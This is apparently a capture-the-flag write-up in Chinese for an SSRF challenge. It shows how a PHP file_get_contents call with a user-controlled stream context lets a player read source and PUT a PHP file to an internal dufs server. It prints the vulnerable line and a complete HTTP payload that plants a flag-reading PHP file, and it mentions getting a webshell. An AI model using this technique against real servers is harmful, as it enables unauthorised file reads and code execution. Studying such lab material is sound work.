ssrf

index.php在查看图片时使用file_get_contents获取任意文件并且以data:image/jpeg;base64<b64encoded>的形式返回，通过这种方式可以尝试读源码
源码中预留了带有dufs的变量名以及上传和搜索的流量特征都可以给选手推测的机会，选手如果运气好遍历到文件甚至可以直接下载到dufs的Linux二进制文件自行进行测试
同时，源码的file_get_contents还预留了options变量，这意味着可以通过此函数进行PUT请求上传任意文件，从而绕过php脚本的限制上传php木马getshell，之后从环境变量获取flag即可

```php
$file_content = @file_get_contents($filename, false, @stream_context_create($_POST['options']));
```

攻击payload

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 9

action=view&filename=http://127.0.0.1:5000/i.php&options[http][method]=PUT&options[http][content]=%3C%3Fphp+echo+getenv%28%27FLAG%27%29%3B%3F%3E
```